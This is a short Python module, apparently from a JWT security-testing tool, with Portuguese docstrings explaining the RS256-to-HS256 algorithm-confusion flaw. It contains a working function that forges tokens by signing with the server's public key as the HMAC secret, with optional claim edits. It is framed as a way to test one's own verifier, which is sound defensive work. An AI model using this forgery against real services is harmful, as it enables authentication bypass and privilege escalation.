"""PoC de confusão de algoritmo (RS/ES → HS).

O clássico: o servidor verifica RS256 com a **chave pública**. Se ele também
aceitar HS256 sem fixar o algoritmo, um atacante assina um token HS256 usando a
**chave pública (que é pública!)** como segredo HMAC — e passa na verificação.

Esta função produz o token forjado para você **testar contra o seu próprio
verificador** e confirmar (ou refutar) a vulnerabilidade.
"""

from __future__ import annotations

from typing import Any

from chaveiro.core.jwt import encode_hmac
from chaveiro.core.models import DecodedToken


def forge_rs_to_hs(
    token: DecodedToken,
    public_key_pem: bytes,
    *,
    alg: str = "HS256",
    edits: dict[str, Any] | None = None,
) -> str:
    """Forja um token HS* usando a chave pública PEM como segredo HMAC.

    Mantém o payload original (com ``edits`` aplicados por cima) e troca o
    algoritmo para ``alg``. O resultado só é aceito por um verificador vulnerável.
    """
    forged_header = {**token.header, "alg": alg}
    forged_payload = {**token.payload, **(edits or {})}
    return encode_hmac(forged_header, forged_payload, public_key_pem)
